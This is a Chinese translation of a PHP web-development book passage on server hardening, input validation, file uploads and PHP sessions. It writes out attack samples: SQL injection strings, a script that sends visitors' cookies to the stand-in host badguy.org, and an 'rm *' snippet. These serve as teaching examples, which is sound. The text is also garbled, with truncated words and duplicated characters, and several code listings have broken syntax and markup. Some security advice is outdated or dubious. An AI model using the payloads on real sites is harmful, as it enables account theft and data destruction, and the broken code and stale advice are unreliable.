  \n### 使用防火墙\n\n无论是在服务器本身使用防火墙，还是在互联网与你的网络交汇点使用防火墙，或者两者都用，你应该确保有一个防火墙阻止指向特定允许端口以外的所有端口的连接，例如典型\
  \ Web 服务器的 TCP 端口 `80` 和 `443`。\n\n更好的场景是在入口（互联网与你的网络交汇点）和服务器本身都运行防火墙。这样做意味着即使攻击者找到了其他进入网络的方法，Web\
  \ 服务器也将受到保护。\n\n所有主要的操作系统都内置了防火墙工具，而且它们既易于设置又易于维护。\n\n## 加固 Apache\n\n加固 Apache\
  \ Web 服务器是一个相当广泛的话题，因此与其尝试将所有内容都挤进一个章节，我们专注于在运行 PHP 应用程序时让 Apache 更安全的两种方法：使用 `SuExec`\
  \ 和 `mod_security`。如果你使用第三方托管提供商，你将无法安装 `SuExec` 或 `mod_security`，而是将依赖托管供应商来（并让他们担心）服务器安全。\n\
  \n### 使用 SuExec 安全 PHP 应用程序\n\n如果你的应用程序运行在 Apache 上（互联网上超过一半的网站都是如此），你可能希望在 Apache\
  \ 配置中启用 `SuExec`。`SuExec` 是 Apache 自带的一种机制，它导致脚本作为脚本用户的身份运行，而不是以 Web 服务器用户的身份运行。\n\
  \n在非 `SuExec` 环境中，所有脚本都以 Web 服务器相同的用户 ID 运行。不幸的是，一个漏洞脚本就可以让恶意用户获得整个 Web 服务器的后门访问，包括运行在同一台服务器上其他网站的脚本。\n\
  \n`SuExec` 尝试通过将 Web 应用程序限制在自己的区域并在其所有者的用户 ID 下运行它们，而不是在 Web 服务器的用户 ID 下运行来解决这个问题。例如，此脚本将在用户\
  \ `jsmith` 的 ID 下运行：\n\n`/home/~jsmith/public_html/scripts/please_hack_me.php`\n\
  \n恶意用户可以利用此脚本，但他或她只能访问 `jsmith` 用户允许使用的文件和程序。服务器上的其他其他用户将免受 `jsmith` 不安全脚本的侵害。\n\
  \n不幸的是，让 `SuExec` 与虚拟主机（即物理上位于同一台 Web 服务器上的多个独立网站）正常配合工作可能是复杂的。`SuExec` 设计用于运行存在于\
  \ Web 服务器文档根目录下的脚本。大多数虚拟主机的设置方式是为每个单独的网站提供自己的文档根，且每个站的文档根并不位于 Web 服务器的文档根目录下。为了绕过这一限制，系统管理员必须在\
  \ Apache 文件中将每个虚拟主机的文档根添加到 Web 服务器的文档根变量中。\n\n`SuExec` 还要求 PHP 脚本以通用网关接口 (CGI) 运行，这比在\
  \ Apache 下作为预编译模块运行 PHP 要慢。CGI 是 Web 应用程序的第一种可行模型，目前仍用于简单脚本。然而，一旦你离开 PHP 脚本领域并开始编写全应用程序，你就需要预编译\
  \ PHP 带来的性能提升。\n\n对于相当简单的 Web 服务器，`SuExec` 可以防止一个不安全的应用程序波及其他所有内容。但在一个具有虚拟服务器、预编译模块以及几十或数百个用户的复杂环境中，你需要一个更健壮的安全模型。`mod_security`（我们将在下一节介绍）是\
  \ Web 服务器安全的一次巨大飞跃，特别是对于运行虚拟服务器和预编译 PHP 的服务器。\n\n### mod_security\n\n`mod_security`\
  \ 是任何 Apache 服务器都应该运行的开源模块。它是一个强大的过滤引擎，监控传入的请求（包括 `GET` 和 `POST`），并剔除可能给服务器带来问题的请求。将其想象成在你服务器门口站着一个私人保镖。\n\
  \n`mod_security` 通过拦截所有指向你服务器的流量工作。它将流量与一组规则比较，以决定停止每个数据包还是允许其通过。\n\n默认情况下，`mod_security`\
  \ 自带一组核心规则，旨在保护服务器免受大多数通用攻击。你可以根据需要添加自己的规则，以响应针对应用程序的特定攻击。\n\n不幸的是，Apache 没有附带 `mod_security`，所以你必须自己获取。幸运的是，它是开源的，可以从\
  \ `www.modsecurity.org` 获取。\n\n## 在 php.ini 中设置安全选项\n\n`php.ini` 文件有很多与安全相关的选项。\n\
  \n**表 5-1 php.ini 推荐安全设置**\n\n| 选项 | 描述 |\n| :--- | :--- |\n| `safe_mode = on` |\
  \ 限制 PHP 脚本仅访问与运行脚本的用户相同的文件，防止目录遍历攻击。 |\n| `safe_mode_gid = off` | 此设置配合 `safe_mode`，允许\
  \ PHP 脚本仅访问所有者和组与运行脚本的用户/组匹配的文件。 |\n| `open_basedir = directory` | 当启用此参数时，PHP 脚本可以仅能访问位于指定目录中的文件。\
  \ |\n| `expose_php = off` | 防止 PHP 在发送给用户的 HTTP 头部中泄露自身信息。 |\n\n\n\n\n\n| `register_globals\
  \ = off` | 如果启用此参数，所有环境变量、`GET`、`POST`、cookie 和服务器变量都注册为全局变量，使得攻击者可以轻易获取。除非你别无选择启用它，否则你应该保持\
  \ `register_globals` 为关闭状态。 |\n| `display_errors = off` | 防止 PHP 错误和警告显示给用户。PHP\
  \ 警告不仅会让你的网站看起来不专业，而且经常会泄露敏感信息，例如路径和 SQL 查询。 |\n| `log_errors = on` | 当启用此参数时，所有的警告和错误都将写入日志文件，你可以稍后在该文件中检查这些警告和错误。\
  \ |\n| `error_log = filename` | 指定 PHP 写入错误和警告的日志文件名。 |\n\n# 安全地处理错误\n\n在理想的世界里，当你创建一个要求用户输入名字表单时，你可以合理地预期他们会输入像\
  \ John 或 Jane 这样的内容。遗憾的是，你也会遇到留空表单、输入地址或简单地输入随机字符字符串的用户。而这些都是无害的用户。攻击者会出于不法目的向你的表单中输入内容。请考虑以下关于坏人如何操作以及如何比他们领先一步的信息。\n\
  \n## 理解危险\n\n攻击者使用不同的方法让你的网站面临风险。一种攻击被称为 SQL 注入。在这种攻击中，攻击者假设表单中收集的信息将用于 SQL 查询 并在你的数据库上执行。攻击者在你的表单字段中输入字符，这些字符在用于查询时会给你带来麻烦。\n\
  \n例如，攻击者可能会输入类似 `John; drop%20table%20users` 的内容。如果你的应用程序设置为将用户名输入数据库，你的 SQL 查询看起来可能像这样：\n\
  \n```\nINSERT INTO users VALUES (John; drop table users);\n```\n\n取决于你的服务器配置，服务器可能会读取该查询并愉快地从你的数据库中删除\
  \ users 表。它可能会对语法稍作抱怨，但如果你的数据库配置比较松散，它将完全按照该行代码的指示执行：向 users 表中添加“John”，然后删除名为 users\
  \ 的表。这可不好。\n\nSQL 注入的另一个例子是，在表单的用户名字段中输入字符以绕过身份验证。假设用户在用户名字段输入了以下字符：\n\n```\nJohn'\
  \ OR 'foo' = 'foo' --\n```\n\n你的脚本可能包含以下语句来测试用户名和密码：\n\n```php\n$sql = \"SELECT\
  \ * FROM User WHERE userID = '$_POST[userID]'\n      AND password = '$_POST[password]'\"\
  ;\n```\n\n如果你在不更改代码的情况下插入用户输入的代码，你将得到如下 SQL 查询：\n\n```php\n$sql = \"SELECT * FROM\
  \ User WHERE username = 'John' OR 'foo' = 'foo' -- ' AND password = '$_POST[password]'\"\
  ;\n```\n\n该查询允许用户在没有有效用户名或密码的情况下登录。在 `WHERE` 子句的第一个部分中，`foo = foo` 是真的。然后，`--` 使查询的剩余部分变为注释，在查询中实际上是见的。因此，此查询始终匹配一行。\n\
  \n另一种危险的表单输入类型是攻击者向你的表单字段中输入脚本。例如，攻击者可能会在表单字段中输入以下内容：\n\n```html\n<script>document.location='http://badguy.org/bad.php?cookies='\
  \ + document.cookie </script>\n```\n\n如果你存储这段文本并将其发送给访问你网站的人，你的访问者将向坏人发送与应用程序相关的\
  \ cookie。另一个恶性脚本可能是：\n\n```html\n<script language=php eval(rm *); </script>\n```\n\
  \n## 测试意外输入\n\n你可以对预期的用户输入数据做几个相当准确的假设。例如，当你询问一个名字时，你预期以下情况为真：\n\n- ![check](img/check.png)\
  \ 数据是字母的——没有数字。\n- ![check](img/check.png) 名字可能包含空格、单引号或连字符，例如 Mary Jane、O’Hara\
  \ 或 Anne-Marie。\n- ![check](img/check.png) 数据肯定不包含 HTML 标签或其他代码段。\n\n这些假设是测试意外输入的关键。通过使用\
  \ PHP 的 `preg_match()` 函数将输入通过正则表达式进行处理，以确定它是否包含任何除空格、单引号或连字符以外的非字母字符。\n\n正则表达式（简称为\
  \ regex）是所有输入测试的核心。请参阅本微型书籍的第 2 章 以了解对正则表达式的解释。\n\n然而，你做的不仅仅是清理用户输入。如果你将任何输入回传给用户（例如确认屏幕），你还必须清理由应用程序生成并发送给用户的\
  \ HTML。恶意用户可以向你的应用程序中注入标记，诱导另一个用户点击链接，该链接将他或她（在不知情的情况下）离开你的站点并进入一个钓鱼克隆网站。\n\n为了防止这类攻击——它通常被称为用户劫持或跨站脚本——对任何计划用于渲染\
  \ HTML 的值使用 `htmlentities()`，如示例所示：\n\n```php\n$inputString = \"<b>Hello World</b>\"\
  ;\n$safe_string = htmlentities($inputString);\n```\n\n在这个示例中，`$safe_string` 将包含：\n\
  \n`&lt;b&gt;Hello World&lt;/b&gt;`\n\n更好的解决方案是再次使用 `preg_match` 并确保输入没有意外字符。\n\n\
  ## 处理意外情况\n\n大多数情况下，你测试了用户的输入，它顺利通过了正则表达式。但当出现问题时怎么办？\n\n处理意外输入的最简单方法是完全停止应用程序。然而，尽管这种方法会阻止坏数据进入你的应用程序，但它也会让仅仅输入错误信息的合法用户感到困惑和沮丧。\n\
  \n因此，更好的解决方案是将用户返回输入界面并让他或她再次尝试。通过让用户知道哪些字段引起了问题，你可以让系统更加友好。第六卷第 3 章介绍了如何在表单字段输入无效数据时重新显示表单。\n\
  \n如果你的测试捕到了看起来像恶意活动，你可能希望采取额外措施，例如写入日志文件、通知管理员，甚至屏蔽源输入的 IP 地址。\n\n## 检查所有表单数据\n\n\
  检查表单中的所有信息，包括用户从列表、复选框或单选按钮选择的任何信息。这些字段也可能包含坏信息。\n\n坏数据是如何从下拉列表或单选按钮发送的？很简单。有浏览器插件可以在点击提交按钮后更改\
  \ `GET` 和 `POST` 数据的值。因此，恶意人员可以简单地将任何值更改为他们想要的任何内容。\n\n\n\n\n\n有时候，当用户未能输入有效数据时，仅仅要求他们返回并重试并不是一个可行的方案。当你不得不根据用户提供的内容来行事时，可以使用一些技术来确保坏数据不会破坏你的应用程序——更糟的是，破坏支持你应用程序的底层系统，例如电子邮件传输和操作系统。接下来的章节将介绍如何防止错误的用户输入搞乱运行。\n\
  \n## 转换 HTML 特殊字符\n\n有时，你可能允许用户在你的应用程序中输入 HTML。例如，博客评论系统通常允许用户发布超链接。但你不必让应用程序对用户可能想输入的任何内容都开放。\n\
  \n如果你允许用户输入 HTML，你应该始终使用 `htmlentities()` 函数将 HTML 特殊字符转换为 HTML 实体。`htmlentities()`\
  \ 函数接受要转换的字符串作为其参数。该函数随后会对以下 HTML 特殊字符进行简单的查找和替换：\n\n- ![check](img/check.png) `&`（和\
  \ 符号）变为 `&amp;`。\n- ![check](img/check.png) `\"`（双引号）变为 `&quot;`。\n- ![check](img/check.png)\
  \ `'`（单引号）变为 `&#039;`。\n- ![check](img/check.png) `<`（小于）变为 `&lt;`。\n- ![check](img/check.png)\
  \ `>`（大于）变为 `&gt;`。\n\n![tip.eps](img/tip_fmt.png) 如果你需要转义 HTML 中每一个具有特殊含义的字符，请使用\
  \ `htmlentities()` 而不是 `htmlspecialchars()`。关于 HTML 中具有特殊含义的字符，请参考 [`www.w3schools.com/html/html_entities.asp`](http://www.w3schools.com/html/html_entities.asp)。\n\
  \n## 在不损害文件系统的下上传文件\n\n大多数不需要上传文件。如果不允许上传文件，这些应用程序会更安全。你可以通过 `php.ini` 文件中的 `file_uploads`\
  \ 设置来防止文件上传。该设置默认开启，如下：\n\n```\nfile_uploads = On\n```\n\n将设置更改为 `Off` 以防止 PHP 脚本上传任何文件。\n\
  \n某些应用程序需要允许用户上传文件。不幸的是，这种需求也带来了严重安全问题的潜在风险。恶意用户可以：\n\n- ![check](img/check.png)\
  \ 发起拒绝服务（DoS）攻击。\n- ![check](img/check.png) 覆盖现有文件。\n- ![check](img/check.png) 在服务器上放置恶意代码以备后用。\n\
  \n由于 Web 应用程序的开放性，你无法在应用程序内部完全保护文件上传功能，但你可以减轻危险。\n\n## 避免文件系统的 DoS 攻击\n\n文件上传创建了\
  \ DoS 攻击的风险，因为恶意用户可以上传极大的文件，并在过程中占用文件系统中所有的资源。上传大文件可以通过阻止服务器写入临时文件或虚拟内存交换文件来有效地导致服务器崩溃。你可以在\
  \ `php.ini` 中限制文件大小，但无法防止每秒尝试上传数百个 2MB 文件的脚本攻击。\n\n你确实应该在 `php.ini` 中对文件大小设置限制。你还应该为上传的文件专门创建一个独立的文件系统。这个独立的系统可以将任何恶作剧与服务器的其他部分隔离开。上传系统可能会被垃圾文件填满，导致你的应用程序上传功能不可用——但至少整个服务器不会崩溃。\n\
  \n### 验证文件\n\n文件上传后，你应该验证它是否是合法文件。虽然你可能无法过滤掉每一个恶意上传，但可以减少那些最明显的攻击。这里是你可以验证文件的几种方法：\n\
  \n- ![check](img/check.png) 验证文件名后缀。这种检查不是最稳健的（因为人可以很容易重命名文件以新的扩展名），但它简单简单，可以捕获一些试图通过你的图片上传函数上传\
  \ `spam_sender.php` 等文件的低级黑客。\n- ![check](img/check.png) 测试你预期的基本文件类型。例如，如果你预期的是图片，可以使用\
  \ `is_binary()` 函数过滤掉文本文件（如 PHP 脚本），如下例：\n\n```php\n$input = $_POST['input_file'];\n\
  \nif (is_binary($input)) {\n    // 正常继续\n}else {\n    // 拒绝文件，重定向浏览器，等\n}\n```\n\
  \n- ![check](img/check.png) 使用 F-Prot 等杀毒病毒程序运行文件（可在 [`www.f-prot.com`](http://www.f-prot.com/)\
  \ 处获得）。\n\n## 使用 FTP 函数确保文件安全上传\n\nWeb 应用程序出于各种原因允许用户上传文件是非常普遍的。例如，某些留言板允许用户上传小图片或头像，显示在该用户的每条帖子旁边。其他应用程序允许你上传数据文件进行分析。你可以使用\
  \ PHP 内置的 `fopen()` 函数，它会自动打开一个指向文件或 URL 的流，允许用户上传文件。不幸的是，这种方法很容易被恶意用户利用，他们可以使用它从远程服务器将文件上传到你的\
  \ Web 服务器。\n\n防止这种类型的利用需要你在 `php.ini` 中禁用两个设置：`register_globals` 和 `url_fopen`。禁用这些设置可以防止用户在没有显式开启该功能的情况下使用\
  \ PHP 内置的文件上传。\n\n在 `php.ini` 中禁用这两个函数后，你仍然需要允许用户上传文件。使用 PHP 的 FTP 函数集（这比 `fopen()`\
  \ 方法安全得多）来允许用户上传文件。\n\n你可以非常直观地使用 FTP 函数。首先，建立连接，然后上传你需要的文件，最后关闭连接。列表 5-1 显示了如何在\
  \ PHP 中使用 FTP 函数：\n\n列表 5-1: 使用基本 FTP 函数\n\n```php\n<?php\n// 设置基本连接\n$connection_id\
  \ = ftp_connect($ftp_server);\n// 使用用户名和密码登录\n$login_result = ftp_login($connection_id,\
  \ $ftp_username, $ftp_password);\n// 检查连接\nif ((!$connection_id) || (!$login_result))\
  \ {\n    echo \"FTP connection has failed!\";\n    echo \"Attempted to connect to\
  \ $ftp_server for user $ftp_username\";\n    exit;\n} else {\n    echo \"Connected\
  \ to $ftp_server, for user $ftp_username\";\n}\n// 上传文件\n$upload = ftp_put($connection_id,\
  \ $destination_file, $source_file, FTP_BINARY);\n// 检查上传状态\nif (!$upload) {\n  \
  \  echo \"FTP upload has failed!\";\n} else {\n    echo \"Uploaded $source_file\
  \ to $ftp_server as $destination_file\";\n}\n// 关闭 FTP 流\nftp_close($connection_id);\n\
  ?>\n```\n\n以下是最常见的 FTP 函数及其参数：\n\n- ![check](img/check.png) `ftp_connect( string\
  \ $host [, int $port [, int $timeout ]] )`: 连接到 FTP 服务器——在这种情况下，就是你的 Web 服务器。\n\
  - ![check](img/check.png) `ftp_login( resource $ftp_stream, string $username, $string\
  \ password )`: 将登录凭据发送到 FTP 服务器。\n- ![check](img/check.png) `ftp_put( resource $ftp_stream,\
  \ string $remote_file, string $local_file, int $mode [, int $startpos] )`: 将文件从本地机器放置到服务器。\n\
  - ![check](img/check.png) `ftp_get( resource $ftp_stream, string $local_file, string\
  \ $remote_file, int $mode [, int $resumos] )`: 从服务器获取文件并发送到本地机器。\n- ![check](img/check.png)\
  \ `ftp_close( resource $ftp_stream )`: 关闭与服务器的连接。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 你需要在完成后立即关闭 FTP 流；否则你将拥有一个易受劫持的开放连接。\n\n# 第 6 章：使用 Session 跟踪访问者\n\n在本章中\n\n-\
  \ 理解 Session 和 Cookie\n\n\n\n\n\n![arrow.png](img/arrow.png) 使用 sessions\n\n本章将介绍\
  \ PHP 用于在多个页面之间跟踪访问者的内置方法，统称为 session（会话）。本章首先介绍 sessions 和 cookies，然后将直接进入正题，向你展示如何使用\
  \ sessions 来跟踪访问者。\n\n## 理解 sessions 和 cookies\n\n你无疑见过某些能够追踪你身份身份的网站，它们可能会在你登录后欢迎你，或者在登录后向你展示有关账户的自定义信息。实现这一功能有几种方法，包括在每次请求时随表单一同发送数据。但这并不安全，对于当今的\
  \ Web 应用程序来说也不够灵活。幸运的是，有一种更好的方法——它触手可及：sessions。\n\n## 查看 sessions\n\nPHP 中的 session\
  \ 是一种从一个页面到另一个页面跟踪用户的安全方式。通过 session，你可以存储用户的信息，例如他们的电子邮件地址、姓名、电话号码以及你拥有的任何其他细节，并在网站所需的任何地方自动填充这些信息。例如，假设在登录时从用户数据库中加载了用户的姓名和电子邮件地址。你可以将这些信息存储在\
  \ session 中，本质上对用户隐藏，直到你使用它们为止。\n\n你可以像使用其他变量一样使用 session 变量。在后台，sessions 存储在一个名为\
  \ `$_SESSION` 的数组中。你就像在 PHP 中使用命名数组一样存储这些值。例如，你可以这样跟踪电子邮件地址和姓名：\n\n```php\n$_SESSION['emailAddress']\
  \ = \"me@example.com\";\n$_SESSION['firstName'] = \"Steve\";\n```\n\n你还可以使用 sessions\
  \ 来跟踪在 Web 表单中填写的信息，而无需通过隐藏表单变量在站点中传输这些信息。\n\n## 使用 cookies\n\nSessions 是通过浏览器 cookies\
  \ 传递的，cookies 是在 Web 浏览器之间发送的少量额外信息。实际信息的内容（或这些信息究竟是什么）取决于你这个程序员。例如，你可以发送一个包含用户名的\
  \ cookie。该 cookie 可能会存储在用户的计算机上，当她下次访问网站时，cookie 将被发送到你的程序，程序将提供个性化的问候。\n\n然而，cookies\
  \ 与你从用户处获得的任何其他数据一样——来自 cookies 的数据需要清洗（正如我们在上一节中讨论过的），因为它们是不可的。换句话说，一旦你的程序向访问者的浏览器发送\
  \ cookie，访问者就可以编辑或更改 cookie 变成他想要的任何内容。所以，如果你（Web 开发者）使用 cookie 来存储用户名，访问者可以将用户名更改为他想要的任何内容，然后将其发送回你的程序。\n\
  \n用户编辑 cookie 的可能性在很大程度上通过简单使用 sessions 解决了。当创建一个 session cookie 时，它使用一个哈希值，这是一个长字符字符串。这意味着即使用户更改了\
  \ cookie 值（换句话说，如果他们更改了哈希），他们并没有真正改变你在程序中直接使用的任何内容。\n\n相反，PHP 会代你处理来自 cookie 的哈希值的转换，然后你就可以继续使用\
  \ `$_SESSION` 数组中的内容了，正如前面解释的那样。你存储在 `$_SESSION` 数组中的实际值用户是看不见的；它们只存在于服务器上。\n\n\
  当然，结合 cookies 使用 sessions 意味着需要在用户的浏览器中启用 cookies。如果没有启用，用户将无法使用应用程序。因此，继续讨论的逻辑位置是展示如何检查是否启用了\
  \ cookies。\n\n## 检查是否启用 cookies\n\n你使用 PHP 中的 `setcookie()` 函数在浏览器中设置 cookie。如果如果你的程序可以读取该\
  \ cookie，你就知道 cookies 已经启用。`setcookie()` 函数接受多个参数来定义 cookie 的行为。例如，你可以设置 cookie\
  \ 的名称，但还可以设置 cookie 的有效时间以及它是否仅在安全连接上使用，以及其他几个选项。\n\n为了我们的目的，我们只需设置 cookie 的名称和值。你可以按照以下步骤检查你的浏览器是否启用了\
  \ cookies。\n\n1. 打开你的文本编辑器并创建一个新的空文件。\n2. 在文件中输入以下代码：\n\n```php\n<?php\nif (isset($_GET['cookiecheck']))\
  \ {\n    if (isset($_COOKIE['testcookie'])) {\n        print \"Cookies are enabled\"\
  ;\n    } else {\n        print \"Cookies are not enabled\";\n    }\n} else {\n \
  \   setcookie('testcookie', \"testvalue\");\n    die(header(\"Location: \" . $_SERVER['PHP_SELF']\
  \ . \"?cookiecheck=1\"));\n}\n?>\n```\n\n3. 将文件保存为 `cookie.php` 并放在你的文档根目录下。\n4.\
  \ 将你的 浏览器指向 `http://localhost/cookie.php`，你将看到一个类似图 6-1 所示的页面。\n\n![9781118213704-fg040601.eps](img/9781118213704-fg040601_fmt.png)\n\
  \n**图 6-1:** 检查是否启用 cookies。\n\n如果你的浏览器中没有启用 cookies，你将看到类似图 6-2 所示的页面。\n\n![9781118213704-fg040602.eps](img/9781118213704-fg040602_fmt.png)\n\
  \n**图 6-2:** 显示未启用 cookies。\n\n注意：如果你想在禁用 cookies 的情况下测试页面，可以这样做。首先，关闭浏览器然后重新打开（不要进入\
  \ `cookie.php` 页面）。在 Internet Explorer 中，进入“Internet 选项”。在“隐私”选项卡上，将设置滑块向上滑动阻止所有\
  \ cookie。在 Firefox 中，进入“选项”，并选择“隐私”选项卡。在“历史记录”部分，选择“使用自定义设置”，然后取消勾选“接受网站 cookie”复选框。现在加载\
  \ `cookie.php` 页面。\n\n现在你已经知道 cookies 已启用，可以安全地开始使用 sessions 了。\n\n# 使用 Sessions\
  \ 传递数据\n\n在启用 cookies 的情况下（大多数浏览器通常都启用），你可以开始使用 sessions 在你的 PHP 应用程序的页面之间存储数据。\n\
  \n##启动 session\n\n使用 sessions 的关键是 `session_start()` 函数。你在每个页面上调用 `session_start()`，随后就可以访问\
  \ `$_SESSION` 数组中的所有项。\n\n该函数的名称 `session_start()` 听起来可能有点奇怪，因为在大多数页面上，你只是想继续该会并访问那里的变量。但实际上，`session_start()`\
  \ 兼顾了两者：在需要时启动一个新会，并在适当的情况下继续现有的会。\n\n`session_start()` 函数的调用如下：\n\n```php\n<?php\n\
  session_start();\n// 此有其他 PHP 语句\n?>\n```\n\n这里是几个页面的代码，用于跟踪你何时访问程序的第一个页面。这展示了 `session_start()`\
  \ 函数的使用以及创建一个用于存储访问时间的变量。\n\n列表 6-1 显示了第一个页面 `page1.php` 的代码。\n\n列表 6-1: 创建 Session\
  \ 变量\n\n```php\n<?php\nsession_start();\n$_SESSION['accessTime'] = date(\"M/d/Y\
  \ g:i:sa\");\nprint \"This is page 1<br />\";\nprint \"You accessed the application\
  \ at: \" . $_SESSION['accessTime'];\nprint \"<<div><a href=\\\"page2.php\\\">Continue\
  \ to next page</</a></div>\";\";\n?>\n```\n\n在浏览器中查看时，该页面看起来如图 6-3 所示。\n\n![9781118213704-fg040603.eps](img/9781118213704-fg040603_fmt.png)\n\
  \n**图 6-3:** 访问程序的第一个页面。\n\n程序的下一个页面随后启动 session，并访问 session 中已设置的任何变量。列表 6-2 显示了第二个页面\
  \ `page2.php` 的代码。\n\n列表 6-2: 第二页面访问 Session 变量\n\n```php\n<?php\nsession_start();\n\
  print \"This is page 2<br />\";\n?>\n```\n\n\n\n\n\n```php\nprint \"You accessed\
  \ the application at: \" . $_SESSION['accessTime'];\nprint \"<div><a href=\\\"page3.php\\\
  \">Continue to next page</a></div>\";\n?>\n```\n\n注意列表 6-2 中的代码，变量 `$_SESSION['accessTime']`\
  \ 并没有再次被设置，而是在话启动后被访问的。当你在 `page1.php` 上并点击链接进入下一页时，你会得到一个像图 6-4 所示的页面。\n\n![9781118213704-fg040604.eps](img/9781118213704-fg040604_fmt.png)\n\
  \n**图 6-4:** 访问应用程序的第二页。\n\n你可以在话中存储几乎任何内容，但你应该意识到，话可能会由于各种原因消失，而且有时确实会。话消失的一个原因是超时。如果用户在页面上停留过久，当他们重新使用应用程序时，话可能已经不存在了。\n\
  \n在第七书中，你将看到如何更改话超时值。然而，即使你更改了话超时，话仍然可能消失。例如，如果用户在话期间清理了 cookie，那么话 cookie 就会消失并启动一个新的。\n\
  \n话消失的实际影响是在是你之前设置的任何变量也会消失。因此，在使用这些值之前检查话是否包含你预期的值是一个良好的习惯。有几种方法可以实现。一种方法是在访问所有变量之前进行检查。例如，你可以修改列表\
  \ 6-2，在输出中使用它之前先检查 `$_SESSION['accessTime']` 变量。列表 6-3 展示了那样的样子。\n\n### 列表 6-3:\
  \ 在使用话变量之前检查其是否设置\n\n```php\n<?php\nsession_start();\nif (!isset($_SESSION['accessTime']))\
  \ {\n    die(header(\"Location: page1.php\"));\n}\nprint \"This is page 2<br />\"\
  ;\nprint \"You accessed the application at: \" . $_SESSION['accessTime'];\nprint\
  \ \"<div><a href=\\\"page3.php\\\">Continue to next page</a></div>\";\n?>\n```\n\
  \n列表 6-3 添加了以下代码：\n\n```php\nif (!isset($_SESSION['accessTime'])) {\n    die(header(\"\
  Location: page1.php\"));\n}\n```\n\n![remember.eps](img/remember_fmt.png) 该代码的位置很重要。因为该代码需要发送\
  \ HTTP 头部，所以它出现在任何其他输出之前。例如，如果该代码出现在“This is page 2” 输出下方，它将无法工作，因为头部已经发送了。该代码出现在任何输出之前，但重要的是，它出现在\
  \ `session_start()` 函数之后。\n\n最佳实践是在使用话变量之前检查它们的存在性，如上所示。然而，在大型应用程序中检查你可能使用的所有变量可能会变得非常繁琐。考虑到这一点，另一个选项是设置一个全局话变量并检查它的存在性，而不是逐个检查每个变量。这是这样做的方法。\n\
  \n列表 6-4 显示了列表 6-1 `page1.php` 的更新版本。在此代码中，有一个单一添加，一个名为 `appStarted` 的新话变量。\n\n\
  ### 列表 6-4: 为话添加全局变量\n\n```php\n<?php\nsession_start();\n$_SESSION['appStarted']\
  \ = true;\n$_SESSION['accessTime'] = date(\"M/d/Y g:i:sa\");\nprint \"This is page\
  \ 1<br />\";\nprint \"You accessed the application at: \" . $_SESSION['accessTime'];\n\
  print \"<div><a href=\\\"page2.php\\\">Continue to next page</a></div>\";\n?>\n\
  ```\n\n然后你可以更改应用程序中的其他页面以检查此变量的存在性，如列表 6-5 中注的更改。\n\n### 列表 6-5: 检查全局话变量\n\n```php\n\
  <?php\nsession_start();\nif (!isset($_SESSION['appStarted'])) {\n    die(header(\"\
  Location: page1.php\"));\n}\nprint \"This is page 2<br />\";\nprint \"You accessed\
  \ the application at: \" . $_SESSION['accessTime'];\nprint \"<div><a href=\\\"page3.php\\\
  \">Continue to next page</a></a>\n?>\n```\n\n## 关闭话\n\n现在你知道如何启动话，但话是如何关闭的呢？简单来说，话会在\
  \ PHP 程序结束时关闭。这意味着你不需要做任何操作来关闭话。\n\n### 使用 session_write_close()\n\n在某些情况下，你需要显式关闭话。这可能是因为两个程序或程序的两个部分需要同时写入话——或者如果你正在使用重定向，而服务器在下一页尝试获取之前没有关闭话。在任何情况下，`session_write_close()`\
  \ 函数会将话参数写入服务器并关闭。你像调用 `session_start()` 一样调用 `session_write_close()`。在调用 `session_write_close()`\
  \ 后尝试写入话变量可能会错误或失败，取决于你的 PHP 配置。\n\n## 理解其他选项\n\n在 PHP 中处理话时有许多选项，其中许多你永远不会遇到，另一些会在特殊情况下遇到。表\
  \ 6-1 列出了一些选项。\n\n#### 表 6-1 选择话选项\n\n| 选项 | 描述 |\n| :--- | :--- |\n| `session_id`\
  \ | 获取或设置话标识符。 |\n| `session_name` | 获取或设置话名称。 |\n| `session_destroy` | 取消当前话的所有变量。\
  \ |\n\n书中展示了使用 `session_destroy` 来提供注销功能。你可以在 PHP 网站 [www.php.net/manual/book.php](http://www.php.net/manual/book.php)\
  \ 上阅读其他话相关的函数。\n\n#### MySQL 账户权限\n\n| 权限 | 描述 |\n| :--- | :--- |\n| ALL | 所有权限\
  \ |\n| ALTER | 修改表结构 |\n| CREATE | 创建新的数据库或表 |\n| DROP | 删除数据库或表 |\n| FILE | 在服务器上读写文件\
  \ |\n| GRANT | 更改 MySQL 账户权限 |\n| INSERT | 向表中插入新行 |\n| SELECT | 从表中读取数据 |\n| SHUTDOWN\
  \ | 关闭 MySQL 服务器 |\n| UPDATE | 修改表中的数据 |\n| USAGE | 无权限 |\n\n![pt_webextra_bw.png](img/pt_webextra_bw.png)\
  \ 更多关于 MySQL 的信息，请访问 [www.dummies.com/extras/phpmysqljavasripth5aio](http://www.dummies.com/extras/phpmysqljavasripth5aio)。\n\
